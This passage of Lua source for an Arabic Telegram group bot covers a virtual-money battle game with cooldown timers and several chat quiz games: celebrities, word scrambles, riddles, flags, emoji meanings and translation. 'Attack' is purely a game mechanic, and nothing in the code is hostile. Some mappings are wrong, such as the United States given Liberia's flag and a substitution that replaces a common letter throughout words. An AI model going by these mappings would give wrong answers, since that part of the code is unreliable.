return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 8 دقائق )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 7 دقائق )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 6 دقائق )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 5 دقائق )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 4 دقائق )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 3 دقائق )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 2 دقيقة )","md",true)
elseif Redis:ttl("attack" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• خسرت بأخر معركة استنى ( 1 دقيقة )","md",true)
end
if Redis:ttl("defen" .. Remsg.sender.user_id) >= 1780 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 30 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1740 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 29 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1680 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 28 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1620 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 27 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1560 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 26 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1500 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 25 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1440 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 24 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1380 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 23 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1320 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 22 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1260 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 21 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1200 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 20 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1140 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 19 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1080 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 18 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 1020 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 17 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 960 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 16 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 900 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 15 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 840 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 14 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 780 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 13 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 720 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 12 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 660 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 11 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 600 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("defen" .. Remsg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• الخصم خسر بأخر معركة\n• يمديك تهاجمه بعد ( 1 دقيقة )","md",true)
end
if Redis:sismember("booob",Remsg.sender.user_id) then
ballancope = Redis:get("boob"..msg.sender.user_id) or 0
ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
if tonumber(ballancope) < 100000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• لا يمكنك تهجم فلوسك اقل من 100000 دولار 💰","md",true)
end
if tonumber(ballanceed) < 100000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• لا يمكنك تهجم عليه فلوسه اقل من 100000 دولار 💰","md",true)
end
if tonumber(coniss) < 9999 then
return LuaTele.sendText(msg.chat_id,msg.id, "• الحد الادنى المسموح هو 10000 دولار 💰","md",true)
end
if tonumber(ballancope) < tonumber(coniss) then
return LuaTele.sendText(msg.chat_id,msg.id, "*• عذرا فلوسك لا تكفي*","md",true)
end
if tonumber(ballanceed) < tonumber(coniss) then
return LuaTele.sendText(msg.chat_id,msg.id, "*• عذرا فلوسه لا تكفي*","md",true)
end
local Textinggt = {"1", "2", "3", "4", "5", "6", "7", "8",}
local Descriptioont = Textinggt[math.random(#Textinggt)]
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
neews = "["..ban.first_name.."](tg://user?id="..ban.id..")"
else
neews = " لا يوجد "
end
local bann = LuaTele.getUser(Remsg.sender.user_id)
if bann.first_name then
neewss = "["..bann.first_name.."](tg://user?id="..bann.id..")"
else
neewss = " لا يوجد "
end
if Descriptioont == "1" or Descriptioont == "3" then
local ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
local ballancope = Redis:get("boob"..msg.sender.user_id) or 0
zrfne = ballancope - coniss
zrfnee = ballanceed + coniss
Redis:set("boob"..msg.sender.user_id , math.floor(zrfne))
Redis:set("boob"..Remsg.sender.user_id , math.floor(zrfnee))
Redis:setex("attack" .. msg.sender.user_id,600, true)
local convert_mony = string.format("%.0f",coniss)
LuaTele.sendText(msg.chat_id,msg.id, "• لقد خسرت في المعركة "..neews.." 🛡\nالفائز : "..neewss.."\nالخاسر : "..neews.."\nالجائزة : "..convert_mony.." دولار 💰","md",true)
elseif Descriptioont == "2" or Descriptioont == "4" or Descriptioont == "5" or  Descriptioont == "6" or Descriptioont == "8" then
local ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
local ballancope = Redis:get("boob"..msg.sender.user_id) or 0
begaatt = Redis:get("numattack"..msg.sender.user_id) or 1000
numattackk = tonumber(begaatt) - 1
if numattackk == 0 then
numattackk = 1
end
attack = coniss / numattackk
zrfne = ballancope + math.floor(attack)
zrfnee = ballanceed - math.floor(attack)
Redis:set("boob"..msg.sender.user_id , math.floor(zrfne))
Redis:set("boob"..Remsg.sender.user_id , math.floor(zrfnee))
Redis:setex("defen" .. Remsg.sender.user_id,1800, true)
Redis:set("numattack"..msg.sender.user_id , math.floor(numattackk))
local convert_mony = string.format("%.0f",math.floor(attack))
LuaTele.sendText(msg.chat_id,msg.id, "• لقد فزت في المعركة\nودمرت قلعة "..neewss.." 🏰\nالفائز : "..neews.."\nالخاسر : "..neewss.."\nالجائزة : "..convert_mony.." دولار 💰\nنسبة قوة المهاجم اصبحت "..numattackk.." 🩸","md",true)
elseif Descriptioont == "7" then
local ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
local ballancope = Redis:get("boob"..msg.sender.user_id) or 0
halfzrf = coniss / 2
zrfne = ballancope - halfzrf
zrfnee = ballanceed + halfzrf
Redis:set("boob"..msg.sender.user_id , math.floor(zrfne))
Redis:set("boob"..Remsg.sender.user_id , math.floor(zrfnee))
Redis:setex("attack" .. msg.sender.user_id,600, true)
local convert_mony = string.format("%.0f",math.floor(halfzrf))
LuaTele.sendText(msg.chat_id,msg.id, "• لقد خسرت في المعركة "..neews.." .\nولكن استطعت اعادة نصف الموارد\nالفائز : "..neewss.."\nالخاسر : "..neews.."\nالجائزة : "..convert_mony.." دولار 💰","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديه حساب بنكي ","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end
if text == "شخصيات" or text == "مشاهير" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
KlamSpeed = {"شوان","سام","ايد شيرين","جاستين","اريانا","سام سميث","ايد","جاستين","معزه","ميسي","صلاح","محمد صلاح","احمد عز","سونيك","كريستيانو","كريستيانو رونالدو","رامز جلال","امير كراره","ويجز","بابلو","تامر حسني","ابيو","شيرين","نانسي عجرم","محمد رمضان","احمد حلمي","محمد هنيدي","حسن حسني","حماقي","احمد مكي"};
name = KlamSpeed[math.random(#KlamSpeed)]
Redis:set(LaRiCa.."mshaher"..msg.chat_id,name)
name = string.gsub(name,"شوان","https://t.me/HC6HH/8")
name = string.gsub(name,"سام","https://t.me/HC6HH/7")
name = string.gsub(name,"سام سميث","https://t.me/HC6HH/7")
name = string.gsub(name,"ايد شيرين","https://t.me/HC6HH/6")
name = string.gsub(name,"ايد","https://t.me/HC6HH/6")
name = string.gsub(name,"جاستين","https://t.me/HC6HH/4")
name = string.gsub(name,"جاستين بيبر","https://t.me/HC6HH/4")
name = string.gsub(name,"اريانا","https://t.me/HC6HH/5")
name = string.gsub(name,"ميسي","https://t.me/HC6HH/10")
name = string.gsub(name,"معزه","https://t.me/HC6HH/10")
name = string.gsub(name,"صلاح","https://t.me/HC6HH/9")
name = string.gsub(name,"محمد صلاح","https://t.me/HC6HH/9")
name = string.gsub(name,"احمد عز","https://t.me/HC6HH/12")
name = string.gsub(name,"كريم عبدالعزيز","https://t.me/HC6HH/11")
name = string.gsub(name,"كريستيانو رونالدو","https://t.me/HC6HH/13")
name = string.gsub(name,"كريستيانو","https://t.me/HC6HH/13")
name = string.gsub(name,"امير كراره","https://t.me/HC6HH/14")
name = string.gsub(name,"رامز جلال","https://t.me/HC6HH/15")
name = string.gsub(name,"ويجز","https://t.me/HC6HH/16")
name = string.gsub(name,"بابلو","https://t.me/HC6HH/17")
--name = string.gsub(name,"جوني سينس","https://t.me/HC6HH/18")
name = string.gsub(name,"سونيك","https://t.me/HC6HH/19")
name = string.gsub(name,"ابيو","https://t.me/HC6HH/20")
name = string.gsub(name,"شيرين","https://t.me/HC6HH/21")
name = string.gsub(name,"نانسي عجرم","https://t.me/HC6HH/22")
name = string.gsub(name,"محمد رمضان","https://t.me/HC6HH/25")
name = string.gsub(name,"احمد حلمي","https://t.me/HC6HH/26")
name = string.gsub(name,"محمد هنيدي","https://t.me/HC6HH/27")
name = string.gsub(name,"حسن حسني","https://t.me/HC6HH/28")
name = string.gsub(name,"احمد مكي","https://t.me/HC6HH/29")
name = string.gsub(name,"تامر حسني","https://t.me/HC6HH/30")
name = string.gsub(name,"حماقي","https://t.me/HC6HH/31")
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&photo="..name.."&caption="..URL.escape("اسرع واحد يقول اسم هذا الفنان").."&reply_to_message_id="..(msg.id/2097152/0.5))
--return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يرتبها ~ {"..name.."}","md",true)  
end
end
if text == "الاسرع" or text == "ترتيب" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
KlamSpeed = {"سحور","سياره","استقبال","قنفذ","ايفون","بزونه","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","قهوه","سفينه","لاريكا","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","سونيك","لعبه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنت","ساحه","جسر"};
name = KlamSpeed[math.random(#KlamSpeed)]
Redis:set(LaRiCa.."Game:Monotonous"..msg.chat_id,name)
name = string.gsub(name,"سحور","س ر و ح")
name = string.gsub(name,"سونيك","ي س ك ن ك")
name = string.gsub(name,"سياره","ه ر س ي ا")
name = string.gsub(name,"استقبال","ل ب ا ت ق س ا")
name = string.gsub(name,"قنفذ","ذ ق ن ف")
name = string.gsub(name,"ايفون","و ن ف ا")
name = string.gsub(name,"لاريكا","ر و ف ر ي")
name = string.gsub(name,"مطبخ","خ ب ط م")
name = string.gsub(name,"كرستيانو","س ت ا ن و ك ر ي")
name = string.gsub(name,"دجاجه","ج ج ا د ه")
name = string.gsub(name,"مدرسه","ه م د ر س")
name = string.gsub(name,"الوان","ن ا و ا ل")
name = string.gsub(name,"غرفه","غ ه ر ف")
name = string.gsub(name,"ثلاجه","ج ه ت ل ا")
name = string.gsub(name,"قهوه","ه ق ه و")
name = string.gsub(name,"سفينه","ه ن ف ي س")
name = string.gsub(name,"محطه","ه ط م ح")
name = string.gsub(name,"طياره","ر ا ط ي ه")
name = string.gsub(name,"رادار","ر ا ر ا د")
name = string.gsub(name,"منزل","ن ز م ل")
name = string.gsub(name,"مستشفى","ى ش س ف ت م")
name = string.gsub(name,"كهرباء","ر ب ك ه ا ء")
name = string.gsub(name,"تفاحه","ح ه ا ت ف")
name = string.gsub(name,"اخطبوط","ط ب و ا خ ط")
name = string.gsub(name,"سلمون","ن م و ل س")
name = string.gsub(name,"فرنسا","ن ف ر س ا")
name = string.gsub(name,"برتقاله","ر ت ق ب ا ه ل")
name = string.gsub(name,"تفاح","ح ف ا ت")
name = string.gsub(name,"مطرقه","ه ط م ر ق")
name = string.gsub(name,"مصر","ص م ر")
name = string.gsub(name,"لعبه","ع ل ه ب")
name = string.gsub(name,"شباك","ب ش ا ك")
name = string.gsub(name,"باص","ص ا ب")
name = string.gsub(name,"سمكه","ك س م ه")
name = string.gsub(name,"ذباب","ب ا ب ذ")
name = string.gsub(name,"تلفاز","ت ف ل ز ا")
name = string.gsub(name,"حاسوب","س ا ح و ب")
name = string.gsub(name,"انترنت","ا ت ن ن  ر ت")
name = string.gsub(name,"ساحه","ح ا ه س")
name = string.gsub(name,"جسر","ر ج س")
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يرتبها ~ {"..name.."}","md",true)  
end
end
if text == "خيروك" or text == "لو خيروك" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
local texting = {
"الو خيروك بين البقاء مدى الحياة مع أخيك أو البقاء مدى الحياة مع حبيبك من تختار؟",
"لو عرضوا عليك السفر لمدة 20 عام مع شخص واحد فقط من تختار؟",
"امن تحب أكثر والدك أم والدتك؟",
"الو خيروك بين إعطاء هدية باهظة الثمن لفرد من أفراد أسرتك من تختار؟",
"لو خيروك بين الذكاء أو الثراء ماذا تختار؟",
"لو خيروك بين الزواج من شخص تحبه أو شخص سيحقق لك جميع أحلامك من تختار؟",
"الو خيروك بين المكوث مدى الحياة مع صديقك المفضل أو مع حبيبك من تختار؟",
"الو خيروك بين الشهادة الجامعية أو السفر حول العالم؟",
"الو خيروك بين العيش في نيويورك أو في لندن أيهما تختار؟",
"لو خيروك بين العودة إلى الماضي أو الذهاب إلى المستقبل أيهما تختار؟",
"لو خيروك بين تمتع شريك حياتك بصفة من الأثنين الطيبة أو حسن التصرف أيهما تختار؟",
"لو خيروك بين الزواج من شخص في عمرك فقير أو شخص يكبرك بعشرين عام غني من تختار",
"لو خيروك بين قتلك بالسم أو قتلك بالمسدس ماذا تختار؟",
"لو خيروك بين إنقاذ والدك أو إنقاذ والدتك من تختار؟",
}
return LuaTele.sendText(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
end
if text == "صراحه" or text == "جرأه" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
local texting = {
"هل تعرضت لغدر في حياتك؟",
"هل تعرف عيوبك؟",
"هل أنت مُسامح أم لا تستطيع أن تُسامح؟",
"إذا قمت بالسفر إلى نُزهة خارج بلدك فمن هو الشخص الذي تُحب أن يُرافقك؟هل تتدخل إذا وجدت شخص يتعرض لحادثة سير أم تتركه وترحل؟",
"ما هو الشخص الذي لا تستطيع أن ترفض له أي طلب؟",
"إذا أعجبت بشخصٍ ما، كيف تُظهر له هذا الإعجاب أو ما هي الطريقة التي ستتبعها لتظهر إعجابك به؟",
"هل ترى نفسك مُتناقضً؟",
"ما هو الموقف الذي تعرضت فيه إلى الاحراج المُبرح؟",
"ما هو الموقف الذي جعلك تبكي أمام مجموعة من الناس رغمًا عنك؟",
"إذا جاء شريك حياتك وطلب الانفصال، فماذا يكون ردك وقته؟",
"إذا كان والد يعمل بعملٍ فقير هل تقبل به أو تستعر منه؟",
"ما الذي يجعلك تُصاب بالغضب الشديد؟",
"هإذا وجدت الشخص الذي أحببتهُ في يومٍ ما يمسك بطفله، هل هذا سيشعرك بالألم؟",
"علاقتك مع اهلك",
"ثلاثة أشياء تحبها"
}
return LuaTele.sendText(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
end
if text == "حزوره" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","البسمار","7","الكعبه","بيت الشعر","لهانه","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيتنجان","البيض","المرايه","الضوء","الهواء","الضل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","بلم"};
name = Hzora[math.random(#Hzora)]
Redis:set(LaRiCa.."Game:Riddles"..msg.chat_id,name)
name = string.gsub(name,"الجرس","شيئ اذا لمسته صرخ ما هوه ؟")
name = string.gsub(name,"عقرب الساعه","اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟")
name = string.gsub(name,"السمك","ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟")
name = string.gsub(name,"المطر","شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟")
name = string.gsub(name,"5","ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ")
name = string.gsub(name,"الكتاب","ما الشيئ الذي له اوراق وليس له جذور ؟")
name = string.gsub(name,"البسمار","ما هو الشيئ الذي لا يمشي الا بالضرب ؟")
name = string.gsub(name,"7","عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ")
name = string.gsub(name,"الكعبه","ما هو الشيئ الموجود وسط مكة ؟")
name = string.gsub(name,"بيت الشعر","ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ")
name = string.gsub(name,"لهانه","وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ")
name = string.gsub(name,"انا","ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟")
name = string.gsub(name,"امي","اخت خالك وليست خالتك من تكون ؟ ")
name = string.gsub(name,"الابره","ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ")
name = string.gsub(name,"الساعه","ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟")
name = string.gsub(name,"22","كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ")
name = string.gsub(name,"غلط","ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ")
name = string.gsub(name,"كم الساعه","ما هو السؤال الذي تختلف اجابته دائما ؟")
name = string.gsub(name,"البيتنجان","جسم اسود وقلب ابيض وراس اخظر فما هو ؟")
name = string.gsub(name,"البيض","ماهو الشيئ الذي اسمه على لونه ؟")
name = string.gsub(name,"المرايه","ارى كل شيئ من دون عيون من اكون ؟ ")
name = string.gsub(name,"الضوء","ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟")
name = string.gsub(name,"الهواء","ما هو الشيئ الذي يسير امامك ولا تراه ؟")
name = string.gsub(name,"الضل","ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ")
name = string.gsub(name,"العمر","ما هو الشيء الذي كلما طال قصر ؟ ")
name = string.gsub(name,"القلم","ما هو الشيئ الذي يكتب ولا يقرأ ؟")
name = string.gsub(name,"المشط","له أسنان ولا يعض ما هو ؟ ")
name = string.gsub(name,"الحفره","ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟")
name = string.gsub(name,"البحر","ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟")
name = string.gsub(name,"الثلج","انا ابن الماء فان تركوني في الماء مت فمن انا ؟")
name = string.gsub(name,"الاسفنج","كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟")
name = string.gsub(name,"الصوت","اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟")
name = string.gsub(name,"بلم","حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ")
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يحل الحزوره ↓\n {"..name.."}","md",true)  
end
end

if text == "اعلام" or text == "اعلام ودول" or text == "اعلام و دول" or text == "دول" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
Redis:del(LaRiCa.."Set:Country"..msg.chat_id)
Country_Rand = {"مصر","العراق","السعوديه","المانيا","تونس","الجزائر","فلسطين","اليمن","المغرب","البحرين","فرنسا","سويسرا","تركيا","انجلترا","الولايات المتحده","كندا","الكويت","ليبيا","السودان","سوريا"}
name = Country_Rand[math.random(#Country_Rand)]
Redis:set(LaRiCa.."Game:Countrygof"..msg.chat_id,name)
name = string.gsub(name,"مصر","🇪🇬")
name = string.gsub(name,"العراق","🇮🇶")
name = string.gsub(name,"السعوديه","🇸🇦")
name = string.gsub(name,"المانيا","🇩🇪")
name = string.gsub(name,"تونس","🇹🇳")
name = string.gsub(name,"الجزائر","🇩🇿")
name = string.gsub(name,"فلسطين","🇵🇸")
name = string.gsub(name,"اليمن","🇾🇪")
name = string.gsub(name,"المغرب","🇲🇦")
name = string.gsub(name,"البحرين","🇧🇭")
name = string.gsub(name,"فرنسا","🇫🇷")
name = string.gsub(name,"سويسرا","🇨🇭")
name = string.gsub(name,"انجلترا","🇬🇧")
name = string.gsub(name,"تركيا","🇹🇷")
name = string.gsub(name,"الولايات المتحده","🇱🇷")
name = string.gsub(name,"كندا","🇨🇦")
name = string.gsub(name,"الكويت","🇰🇼")
name = string.gsub(name,"ليبيا","🇱🇾")
name = string.gsub(name,"السودان","🇸🇩")
name = string.gsub(name,"سوريا","🇸🇾")
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يرسل اسم الدولة ~ {"..name.."}","md",true)  
end
end

if text == "معاني" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
Redis:del(LaRiCa.."Set:Maany"..msg.chat_id)
Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
name = Maany_Rand[math.random(#Maany_Rand)]
Redis:set(LaRiCa.."Game:Meaningof"..msg.chat_id,name)
name = string.gsub(name,"قرد","🐒")
name = string.gsub(name,"دجاجه","🐔")
name = string.gsub(name,"بطريق","🐧")
name = string.gsub(name,"ضفدع","🐸")
name = string.gsub(name,"بومه","🦉")
name = string.gsub(name,"نحله","🐝")
name = string.gsub(name,"ديك","🐓")
name = string.gsub(name,"جمل","🐫")
name = string.gsub(name,"بقره","🐄")
name = string.gsub(name,"دولفين","🐬")
name = string.gsub(name,"تمساح","🐊")
name = string.gsub(name,"قرش","🦈")
name = string.gsub(name,"نمر","🐅")
name = string.gsub(name,"اخطبوط","🐙")
name = string.gsub(name,"سمكه","🐟")
name = string.gsub(name,"خفاش","🦇")
name = string.gsub(name,"اسد","🦁")
name = string.gsub(name,"فأر","🐭")
name = string.gsub(name,"ذئب","🐺")
name = string.gsub(name,"فراشه","🦋")
name = string.gsub(name,"عقرب","🦂")
name = string.gsub(name,"زرافه","🦒")
name = string.gsub(name,"قنفذ","🦔")
name = string.gsub(name,"تفاحه","🍎")
name = string.gsub(name,"باذنجان","🍆")
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يدز معنى السمايل ~ {"..name.."}","md",true)  
end
end
if text == "انجليزي" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
Redis:del(LaRiCa.."Set:enkliz"..msg.chat_id)
enkliz_Rand = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','مختلف','سدني','نقود','اعلم','ذئب','تمساح','ذكي',};
name = enkliz_Rand[math.random(#enkliz_Rand)]
Redis:set(LaRiCa.."Game:enkliz"..msg.chat_id,name)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'سدني','Sydney')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'مختلف','Different')
name = string.gsub(name,'ذكي','Intelligent')
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يترجم ~ {"..name.."}","md",true)  
end
end
if text == "العكس" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
Redis:del(LaRiCa.."Set:Aks"..msg.chat_id)
katu = {"باي","فهمت","موزين","اسمعك","احبك","موحلو","نضيف","حاره","ناصي","جوه","سريع","ونسه","طويل","سمين","ضعيف","شريف","شجاع","رحت","عدل","نشيط","شبعان","موعطشان","خوش ولد","اني","هادئ"}
name = katu[math.random(#katu)]
Redis:set(LaRiCa.."Game:Reflection"..msg.chat_id,name)
name = string.gsub(name,"باي","هلو")
name = string.gsub(name,"فهمت","مافهمت")
name = string.gsub(name,"موزين","زين")
name = string.gsub(name,"اسمعك","ماسمعك")
name = string.gsub(name,"احبك","ماحبك")
name = string.gsub(name,"موحلو","حلو")
name = string.gsub(name,"نضيف","وصخ")
name = string.gsub(name,"حاره","بارده")
name = string.gsub(name,"و","عالي")
name = string.gsub(name,"جوه","فوك")
name = string.gsub(name,"سريع","بطيء")
name = string.gsub(name,"ونسه","ضوجه")
name = string.gsub(name,"طويل","قزم")
